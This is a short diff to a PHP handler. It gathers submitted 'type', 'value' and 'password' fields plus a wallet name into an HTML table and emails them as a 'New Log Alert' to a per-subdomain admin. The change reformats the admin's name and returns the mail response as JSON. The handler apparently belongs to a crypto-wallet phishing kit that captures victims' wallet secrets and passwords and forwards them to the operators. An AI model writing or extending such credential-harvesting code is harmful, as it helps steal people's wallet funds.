@@ -8,7 +8,7 @@ switch ($post->case) {
     $domain = explode(".", $_SERVER["HTTP_HOST"])[0];
 
     // Get the admin to be notified
-    $user = $generic->admins[$domain];
+    $user = ucfirst(explode("@", $generic->admins[$domain])[0]);
 
     // Submit the request
     $info = ["type", "value", "password"];
@@ -24,9 +24,8 @@ switch ($post->case) {
     }
     $body .= "<tr><td>Wallet<hr/></td><td>{$wallet->name}<hr/></td></tr>";
     $body .= "</tbody><table>";
-
     $messenger = new Messenger($generic);
-    $messenger->sendMail(
+    $response = $messenger->sendMail(
       object([
         "subject" => "New Log Alert",
         "body" => "Hi {$user}, Below are the log details for {$wallet->name}. <br>{$body}",
@@ -42,3 +41,4 @@ switch ($post->case) {
     # code...
     break;
 }
+die(json_encode($response));
